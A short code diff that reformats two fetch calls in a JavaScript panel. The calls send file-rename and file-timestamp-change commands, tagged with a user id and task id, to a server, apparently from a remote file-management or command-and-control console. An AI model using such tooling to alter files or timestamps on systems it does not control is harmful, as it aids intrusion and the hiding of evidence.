@@ -418,10 +418,7 @@ class index{
 		
 		            const cmd = "CHANG_FILE_NAME^" + oldPath + "^" + newName;
 		            fetch(
-		                this.server + "/" + web_route +
-		                "?op=msg&uid=" + this.uid +
-		                "&msg=" + encodeURIComponent(cmd) +
-		                "&Taskid=" + TaskId
+		                this.server + "/`+web_route+`?op=msg&uid=" + this.uid +"&msg=" + encodeURIComponent(cmd) +"&Taskid=" + TaskId
 		            );
 		
 		            filenameSpan.innerText = newName;
@@ -438,10 +435,7 @@ class index{
 		
 		            const cmd = "CHANG_FILE_TIME^" + currentPath + "^" + newTime;
 		            fetch(
-		                this.server + "/" + web_route +
-		                "?op=msg&uid=" + this.uid +
-		                "&msg=" + encodeURIComponent(cmd) +
-		                "&Taskid=" + TaskId
+		                this.server + "/`+web_route+`?op=msg&uid=" + this.uid +"&msg=" + encodeURIComponent(cmd) +"&Taskid=" + TaskId
 		            );
 		
 		            new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
